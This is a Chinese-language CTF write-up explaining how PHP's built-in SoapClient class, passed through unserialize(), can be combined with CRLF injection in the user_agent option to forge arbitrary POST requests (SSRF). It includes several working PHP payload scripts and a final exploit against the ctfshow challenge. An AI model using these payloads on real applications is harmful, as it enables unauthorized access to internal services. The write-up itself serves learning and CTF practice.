# SoapClient反序列化SSRF组合拳

原创

修改于 2021-09-16 14:36:16

1.5K0

举报

文章被收录于专栏：ly0n

## 前言

有的时候我们会遇到只给了反序列化点，但是没有POP链的情况。可以尝试利用php内置类来进行反序列化。

## 魔术方法

魔术方法详细的讲解可以移步另一篇文章

[https://cloud.tencent.com/developer/article/1740465](https://cloud.tencent.com/developer/article/1740465?from_column=20421&from=20421)

代码语言：javascript

复制

```javascript
构造函数 __construct 对象被创建的时候调用
析构函数 __destruct 对象被销毁的时候调用
方法重载 __call 在对象中调用一个不可访问方法时调用
方法重载 __callStatic 在静态上下文中调用一个不可访问方法时调用
在给不可访问属性赋值时，__set() 会被调用。
读取不可访问属性的值时，__get() 会被调用。
当对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用
当对不可访问属性调用 unset() 时，__unset() 会被调用
__sleep() 在serialize() 函数执行之前调用
__wakeup() 在unserialize() 函数执行之前调用
__toString 在一个类被当成字符串时被调用（不仅仅是echo的时候,比如file_exists()判断也会触发）
```



## CRLF攻击

什么是CRLF，其实就是回车和换行造成的漏洞，十六进制为`0x0d,0x0a`，在HTTP当中`header`和`body`之间就是两个CRLF分割的，所以如果我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样就能注入一些会话cookie和html代码，所以crlf injection 又叫做 HTTP Response Splitting。



## **SoapClient与反序列化**

### **SoapClient::__call**

[https://www.php.net/manual/zh/soapclient.call.php](https://cloud.tencent.com/developer/tools/blog-entry?target=https%3A%2F%2Fwww.php.net%2Fmanual%2Fzh%2Fsoapclient.call.php&objectId=1878220&objectType=1&isNewArticle=undefined)

`__call()` 方法是对象中调用一个不可访问方法时调用

SOAP:简单对象访问协议

底层通讯协议为HTTP,传输数据格式为XML。

测试SoapClient类调用一个不存在的函数，会去调用`__call()`方法

代码语言：javascript

复制

```javascript
<?php
$a = new SoapClient(null,array('uri'=>'bbb', 'location'=>'http://127.0.0.1:6888/'));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c->not_exists_function();
```

nc监听6888端口



![img](https://ask.qcloudimg.com/http-save/yehe-7880177/715d0c66f8958ac3d3971396e2cfc3ba.png)

从结果我们可以看到SOAPAction参数可控，我们可以在SOAPAction处注入恶意的换行，这样一来我们POST提交的header就是可控的，我们就可以通过注入来执行我们想要执行的操作了。

尝试传入token,发现新的问题，Content-Type在`SOAPAction`的上面，就无法控制`Content-Typ`,也就不能控制POST的数据

在header里`User-Agent`在`Content-Type`前面，通过`user_agent`同样可以注入CRLF,控制`Content-Type`的值

这个点是百度看到的，文章地址：[https://zhuanlan.zhihu.com/p/80918004](https://cloud.tencent.com/developer/tools/blog-entry?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F80918004&objectId=1878220&objectType=1&isNewArticle=undefined)

尝试控制`token`

代码语言：javascript

复制

```javascript
<?php
$target = 'http://127.0.0.1:6888';
$post_string = 'token=ly0n';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    );
$b = new SoapClient(null,array('location' => $target,'user_agent'=>'ly0n^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'      => "aaab"));

$aaa = serialize($b);
$aaa = str_replace('^^',"\r\n",$aaa);
$aaa = str_replace('&','&',$aaa);
echo $aaa;

$c = unserialize($aaa);
$c->not_exists_function();
?>
```





![img](https://ask.qcloudimg.com/http-save/yehe-7880177/e1bde71d6f27a19ad3c39f5262ac5003.png)

成功控制

使用SoapClient反序列化+CRLF**可以生成任意POST请求**。

```
Deserialization + __call + SoapClient + CRLF = SSRF
```



## **题目分析**

打开题目看到只有几行代码

代码语言：javascript

复制

```javascript
<?php

highlight_file(__FILE__);


$vip = unserialize($_GET['vip']);
//vip can get flag one key
$vip->getFlag();
```



还有另外一个flag.php文件

代码语言：javascript

复制

```javascript
$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
array_pop($xff);
$ip = array_pop($xff);


if($ip!=='127.0.0.1'){
	die('error');
}else{
	$token = $_POST['token'];
	if($token=='ctfshow'){
		file_put_contents('flag.txt',$flag);
	}
}
```

`$xff`经过了`array_pop()`的处理，这个函数的作用是弹出数组最后一个单元（出栈），当我刚开始只传入了一个127.0.0.1时发现并没有利用成功，也就是说，此时数组内的最后一个ip并不是127.0.0.1，于是传入多个127.0.0.1进行尝试，发现传入两个即可成功绕过。在百度其原理看到了[Y4tacker](https://cloud.tencent.com/developer/tools/blog-entry?target=https%3A%2F%2Fy4tacker.blog.csdn.net%2Farticle%2Fdetails%2F110521104&objectId=1878220&objectType=1&isNewArticle=undefined)师傅的解释



![img](https://ask.qcloudimg.com/http-save/yehe-7880177/e8ec3acf4b4bcdb990fbb5b309a9361c.png)

最终exp

代码语言：javascript

复制

```javascript
<?php
$target = 'http://127.0.0.1/flag.php';
$post_string = 'token=ctfshow';
$headers = array(
    'X-Forwarded-For: 127.0.0.1,127.0.0.1',
    'UM_distinctid:17b33d40a5785b-043dfa37ff7c9d-35607403-1fa400-17b33d40a58b9a'
);
$b = new SoapClient(null,array('location' => $target,'user_agent'=>'ly0n^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri' => "aaab"));

$aaa = serialize($b);
$aaa = str_replace('^^',"\r\n",$aaa);
$aaa = str_replace('&','&',$aaa);
echo urlencode($aaa);

?>
```

通过vip传入参数，然后访问flag.txt即可！